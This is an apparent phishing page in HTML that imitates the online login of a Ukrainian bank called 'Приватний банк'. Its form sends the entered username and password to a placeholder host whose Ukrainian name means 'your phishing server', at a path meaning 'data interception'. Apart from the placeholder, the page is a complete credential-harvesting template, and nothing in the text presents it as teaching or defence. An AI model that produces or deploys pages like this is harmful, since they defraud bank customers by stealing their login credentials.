<!DOCTYPE html>
<html>
<head>
    <title>Приватний банк</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            margin: 0;
            padding: 0;
            background-color: #f4f4f4;
        }
        header {
            background-color: #003366;
            color: #fff;
            padding: 10px 20px;
            text-align: center;
        }
        .container {
            width: 80%;
            margin: 20px auto;
            padding: 20px;
            background-color: #fff;
            border-radius: 5px;
            box-shadow: 0 2px 5px rgba(0,0,0,0.1);
        }
        footer {
            background-color: #003366;
            color: #fff;
            text-align: center;
            padding: 10px 20px;
            position: fixed;
            bottom: 0;
            width: 100%;
        }
    </style>
</head>
<body>
    <header>
        <h1>Приватний банк</h1>
    </header>
    <div class="container">
        <h2>Ласкаво просимо в електронне банківське обслуговування</h2>
        <p>Будь ласка, увійдіть, щоб продовжити:</p>
        <form action="https://ваш-сервер-фішингу.com/перехоплення-даних" method="post">
            <label for="username">Логін:</label><br>
            <input type="text" id="username" name="username"><br>
            <label for="password">Пароль:</label><br>
            <input type="password" id="password" name="password"><br><br>
            <input type="submit" value="Увійти">
        </form>
    </div>
    <footer>
        &copy; 2024 Приватний банк
    </footer>
</body>
</html>
